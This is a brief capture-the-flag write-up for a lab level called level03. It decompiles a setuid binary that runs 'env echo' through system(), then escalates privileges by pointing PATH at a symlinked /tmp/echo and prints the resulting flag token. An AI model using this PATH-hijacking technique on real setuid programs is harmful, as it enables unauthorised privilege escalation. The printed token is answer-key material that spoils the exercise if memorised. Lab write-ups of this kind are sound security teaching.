# level03

```bash
$ ls -l
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
$ ./level03
Exploit me
```

A quick `hexdump -C` of the `level03` executable shows it contains a string: `/usr/bin/env echo Exploit me`

Further examination with ghidra shows the entire source code:

```C
int main(int argc, char **argv, char **envp)
{
    __gid_t __rgid;
    __uid_t __ruid;
    int iVar1;
    gid_t gid;
    uid_t uid;

    __rgid = getegid();
    __ruid = geteuid();
    setresgid(__rgid,__rgid,__rgid);
    setresuid(__ruid,__ruid,__ruid);
    iVar1 = system("/usr/bin/env echo Exploit me");
    return iVar1;
}
```

We then launch getflag instead of echo by tricking `env` with a symlink and a custom `PATH`:

```bash
ln -s /bin/getflag /tmp/echo
PATH=/tmp ./level03
# -> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
